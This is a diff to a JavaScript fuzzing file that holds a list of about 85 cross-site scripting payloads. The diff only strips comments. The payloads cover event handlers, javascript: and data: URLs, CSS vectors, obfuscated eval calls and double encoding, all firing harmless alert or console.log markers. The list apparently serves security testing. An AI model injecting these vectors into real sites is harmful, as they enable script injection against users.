@@ -6,7 +6,6 @@
 window.FuzzingPayloads = {
 
     XSS: [
-        // Basic XSS payloads
         '<img src=x onerror=alert("XSS_1")>',
         '<svg onload=console.log("XSS_2")>',
         '<script>console.log("XSS_3")</script>',
@@ -30,8 +29,6 @@ window.FuzzingPayloads = {
         '<math><mtext><table><mglyph><style><script>console.log("XSS_21")</script>',
         '<<img src="x" onerror="console.log(\'XSS_22\')//">>',
         '<p title="onerror=console.log(\'XSS_23\')//"><img src="x" onerror=console.log(\'XSS_24\') />',
-
-        // Script-based payloads
         'con\\u0073ole.log("XSS_25")',
         'window["con"+"sole"]["l"+"og"]("XSS_26")',
         'setTimeout("console.log(\'XSS_27\')")',
@@ -42,8 +39,6 @@ window.FuzzingPayloads = {
         '(()=>{}).constructor("return console.log(\'XSS_32\')")();',
         'globalThis[\'eva\'+\'l\'](\'console.log("XSS_33")\')',
         '[].filter.constructor("return console.log(\'XSS_34\')")()',
-
-        // URL-based payloads
         'javascript:void(con%73ole.log("XSS_35"))',
         'javascript://comment%0Aconsole.log("XSS_36")',
         'javascript:void%20console.log("XSS_37")',
@@ -52,7 +47,6 @@ window.FuzzingPayloads = {
         '  javascript:console.log("XSS_40")',
         'javascrip&#116;:console.log("XSS_41")',
         '\u006aavascript:console.log("XSS_42")',
-
         'document.body.innerHTML="<img src=x onerror=alert(\'XSS_43\')>"',
         'document.write("<script>alert(\'XSS_44\')</script>")',
         'location="javascript:alert(\'XSS_45\')"',
@@ -71,15 +65,11 @@ window.FuzzingPayloads = {
         '<svg><style>&{alert(\'XSS_57\')}</style></svg>',
         '<math><maction actiontype="statusline#" xlink:href="javascript:alert(\'XSS_58\')">Click</maction></math>',
         '<img src=1 onerror="alert(\'XSS_59\')" style="position:fixed;left:0;top:0;width:100%;height:100%">',
-
-        // CSS-based XSS
         '<div style="background-image:url(javascript:alert(\'XSS_60\'))"></div>',
         '<div style="background-image:url(&#1;javascript:alert(\'XSS_61\'))"></div>',
         '<div style="behavior:url(#default#time2)" onbegin="alert(\'XSS_62\')"></div>',
         '<link rel="stylesheet" href="javascript:alert(\'XSS_63\')">',
         '<style>@import "javascript:alert(\'XSS_64\')";</style>',
-
-        // More advanced payloads
         '<object data="javascript:alert(\'XSS_65\')"></object>',
         '<embed src="javascript:alert(\'XSS_66\')"></embed>',
         '<form action="javascript:alert(\'XSS_67\')"><input type="submit"></form>',
@@ -90,8 +80,6 @@ window.FuzzingPayloads = {
         '<video><source onerror="alert(\'XSS_72\')">',
         '<audio><source onerror="alert(\'XSS_73\')">',
         '<math href="javascript:alert(\'XSS_74\')">click</math>',
-
-        // Protocol handling and data URLs
         'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTXzc1Jyk8L3NjcmlwdD4=',
         'vbscript:alert(\'XSS_76\')',
         'javascript:alert(\'XSS_77\')',
@@ -99,12 +87,8 @@ window.FuzzingPayloads = {
         'javascript:prompt(\'XSS_79\')',
         'javascript:document.vulnerable=true',
         'javascript:window.onerror=alert;throw\'XSS_80\'',
-
-        // Double encoded payloads
         '%253Cscript%253Ealert(%2527XSS_81%2527)%253C/script%253E',
         '%2536e%2561v%2561s%2563%2572%2569p%2574%253aalert(%2527XSS_82%2527)',
-
-        // Event handlers
         '<svg onload=alert(\'XSS_83\')>',
         '<body onload=alert(\'XSS_84\')>',
         '<img src=x onload=alert(\'XSS_85\')>',
